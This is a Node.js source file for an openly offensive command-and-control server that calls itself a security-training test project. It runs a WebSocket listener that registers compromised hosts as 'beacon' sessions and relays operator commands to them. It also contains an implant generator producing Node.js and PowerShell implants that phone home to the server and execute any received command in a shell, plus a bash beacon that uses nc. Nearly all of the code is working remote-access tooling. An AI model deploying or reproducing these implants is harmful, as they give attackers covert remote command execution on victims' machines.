const express = require("express");
const { Server } = require("socket.io");
const { createServer } = require("http");
const WebSocket = require("ws");
const cors = require("cors");
const crypto = require("crypto");
const os = require("os");
const path = require("path");

const HTTP_PORT = 3000;
const app = express();
const server = createServer(app);

app.use(cors({ origin: "*" }));
app.use(express.json({ limit: "50mb" }));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const sessions = new Map();
let wss = null;
let listenerPort = 4444;

function getActiveSessions() {
  const now = Date.now();
  const active = [];
  for (const [id, session] of sessions.entries()) {
    if (now - session.lastSeen.getTime() < 300000) {
      // 5min timeout
      active.push({ ...session, id });
    } else {
      sessions.delete(id);
    }
  }
  return active;
}

function broadcastSessions() {
  io.emit("sessions_update", getActiveSessions());
}

function logToConsole(type, message) {
  const timestamp = new Date().toLocaleTimeString();
  console.log(`[${timestamp}] [${type.toUpperCase()}] ${message}`);
  io.emit("server_log", { type, message });
}

function closeListener() {
  if (wss) {
    wss.close();
    wss = null;
    io.emit("listener_status", { running: false });
    logToConsole("listener", "STOPPED");
  }
}

function startListener(port) {
  closeListener();
  listenerPort = port || 4444;

  wss = new WebSocket.Server({ port: listenerPort, path: "/c2" });

  wss.on("connection", (ws, req) => {
    const ip = req.socket.remoteAddress?.replace("::ffff:", "") || "unknown";
    const sessionId = crypto.randomUUID();

    const session = {
      id: sessionId,
      name: `Beacon-${ip.replace(/[:.]/g, "_")}`,
      ip,
      pid: process.pid,
      arch: os.arch(),
      lastSeen: new Date(),
      socket: ws,
      alive: true,
    };

    sessions.set(sessionId, session);
    broadcastSessions();
    logToConsole("new_session", `${session.name} (${ip}) CONNECTED ✅`);

    // ✅ KEEP SESSION ALIVE - Heartbeat
    const heartbeat = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "ping" }));
      }
    }, 10000);

    ws.on("message", (data) => {
      session.lastSeen = new Date();
      const raw = data.toString();

      try {
        const msg = JSON.parse(raw);
        switch (msg.type) {
          case "beacon":
          case "pong":
            session.pid = msg.pid || session.pid;
            session.arch = msg.arch || session.arch;
            session.name = msg.hostname || session.name;
            break;
          case "result":
            io.emit("output", { sessionId: session.id, data: msg.data || "" });
            break;
          default:
            io.emit("output", { sessionId: session.id, data: raw });
        }
      } catch (e) {
        io.emit("output", { sessionId: session.id, data: raw });
      }
      broadcastSessions();
    });

    ws.on("close", () => {
      clearInterval(heartbeat);
      sessions.delete(sessionId);
      logToConsole("session_close", session.name);
      broadcastSessions();
    });

    ws.on("error", (err) => {
      console.error("WS Error:", err.message);
    });
  });

  logToConsole("listener", `LIVE on *:${listenerPort}/c2 🚀`);
  io.emit("listener_status", { running: true, port: listenerPort });
}

const io = new Server(server, {
  cors: { origin: "*" },
  path: "/socket.io/",
});

io.on("connection", (socket) => {
  logToConsole("ui", `UI connected: ${socket.id.slice(0, 8)}`);

  socket.emit("sessions_update", getActiveSessions());
  socket.emit("listener_status", { running: !!wss, port: listenerPort });

  socket.on("start_listener", (port) => {
    startListener(Number(port));
  });

  socket.on("stop_listener", closeListener);

  socket.on("generate_implant", (data) => {
    const { targetOS, beaconInterval = 5000, port = listenerPort } = data;
    const codeData = generateImplantCode(
      targetOS,
      beaconInterval,
      port || listenerPort,
    );
    socket.emit("implant_generated", codeData);
  });

  socket.on("exec_cmd", ({ sessionId, cmd }) => {
    const session = sessions.get(sessionId);
    if (session && session.socket.readyState === WebSocket.OPEN) {
      session.socket.send(JSON.stringify({ type: "cmd", cmd }));
      logToConsole("cmd_exec", `${session.name}: ${cmd}`);
    } else {
      socket.emit("output", { sessionId, data: "❌ Session disconnected" });
    }
  });

  socket.on("disconnect", () => {
    logToConsole("ui", `UI disconnected: ${socket.id.slice(0, 8)}`);
  });
});

// ✅ PERFECTED Implant Generator - NO CRASHES
function generateImplantCode(osType, interval, port) {
  // Get best IP
  let ip = "0.0.0.0";
  try {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
      for (const addr of iface) {
        if (addr.family === "IPv4" && !addr.internal) {
          ip = addr.address;
          break;
        }
      }
      if (ip !== "0.0.0.0") break;
    }
  } catch (e) {
    ip = "0.0.0.0";
  }

  const templates = {
    // ✅ PRODUCTION Node.js Implant - STABLE
    nodejs: `const WebSocket = require('ws');
const { spawn } = require('child_process');
const os = require('os');

const ws = new WebSocket('ws://${ip}:${port}/c2');
console.log('[+] C2 Implant Active');

ws.on('open', () => {
  // Beacon every 5s
  setInterval(() => {
    if (ws.readyState === 1) {
      ws.send(JSON.stringify({
        type: 'beacon',
        hostname: os.hostname(),
        pid: process.pid,
        arch: os.arch()
      }));
    }
  }, ${Math.min(interval, 5000)});
  
  // Pong for keepalive
  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      if (msg.type === 'ping') {
        ws.send(JSON.stringify({type: 'pong'}));
        return;
      }
      if (msg.type === 'cmd') {
        const proc = spawn(msg.cmd, { shell: true, stdio: 'pipe' });
        let output = '';
        proc.stdout.on('data', (d) => output += d);
        proc.stderr.on('data', (d) => output += d);
        proc.on('close', (code) => {
          ws.send(JSON.stringify({ type: 'result', data: output }));
        });
      }
    } catch(e) {}
  });
});`,

    // ✅ PRODUCTION PowerShell - STABLE
    powershell: `Add-Type -AssemblyName System.Net.WebSockets
$ErrorActionPreference = 'SilentlyContinue'
try {
  $ws = New-Object System.Net.WebSockets.ClientWebSocket
  $uri = New-Object Uri('ws://${ip}:${port}/c2')
  $ct = New-Object System.Threading.CancellationToken
  
  $connected = $ws.ConnectAsync($uri, $ct).Wait(10000)
  if ($ws.State -eq 'Open') {
    while ($ws.State -eq 'Open') {
      $buffer = New-Object byte[] 65536
      $result = $ws.ReceiveAsync($buffer, $ct).Result
      $msgJson = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
      
      try {
        $msg = $msgJson | ConvertFrom-Json
        if ($msg.type -eq 'ping') {
          $ws.SendAsync(([Text.Encoding]::UTF8.GetBytes('{"type":"pong"}')), 1, $true, $ct) | Out-Null
        } elseif ($msg.type -eq 'cmd') {
          $output = & powershell -c $msg.cmd 2>&1 | Out-String
          $resultJson = @{type='result'; data=$output} | ConvertTo-Json -Compress
          $bytes = [Text.Encoding]::UTF8.GetBytes($resultJson)
          $ws.SendAsync($bytes, 1, $true, $ct) | Out-Null
        }
      } catch {}
      
      Start-Sleep 2
    }
  }
} catch {}`,

    bash: `#!/bin/bash
while true; do
  echo '{"type":"beacon","hostname":"$(hostname)","pid":$$}' | nc -w2 ${ip} ${port} 2>/dev/null
  sleep 5
done`,
  };

  return {
    code:
      templates[osType] ||
      templates.powershell ||
      templates.bash ||
      templates.nodejs,
    filename: `c2_implant_${osType}.js`,
    targetOS: osType,
    serverIP: ip,
    serverPort: port,
  };
}

server.listen(HTTP_PORT, () => {
  console.clear();
  console.log(`
╔══════════════════════════════════════════════════════╗
║  🚀 SecurityTalent C2 v2.1- TestProject        ✅    ║
║  🌐 http://localhost:${HTTP_PORT}                     ║
║  📡 Follow US: https://securitytalent.net    ║
╚══════════════════════════════════════════════════════╝
  `);
});
